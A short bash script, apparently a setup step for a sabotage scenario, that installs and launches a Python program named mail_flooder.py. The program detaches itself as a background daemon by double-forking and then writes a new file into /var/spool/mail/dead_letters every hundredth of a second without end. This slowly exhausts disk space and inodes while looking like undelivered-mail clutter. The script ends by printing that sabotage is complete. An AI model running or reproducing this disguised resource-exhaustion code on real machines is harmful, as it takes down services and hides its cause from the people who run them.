#!/bin/bash
set -e
mkdir -p /var/spool/mail/dead_letters
cat << 'PYEOF' > /usr/local/bin/mail_flooder.py
import os, sys, time
if os.fork() > 0: sys.exit(0)
os.setsid()
if os.fork() > 0: sys.exit(0)
cnt = 0
while True:
    with open(f"/var/spool/mail/dead_letters/dead_{cnt}.msg", "w") as f:
        f.write("undelivered mail notification\n")
    cnt += 1
    time.sleep(0.01)
PYEOF
chmod +x /usr/local/bin/mail_flooder.py
python3 /usr/local/bin/mail_flooder.py
echo "102-3 Sabotage completed."
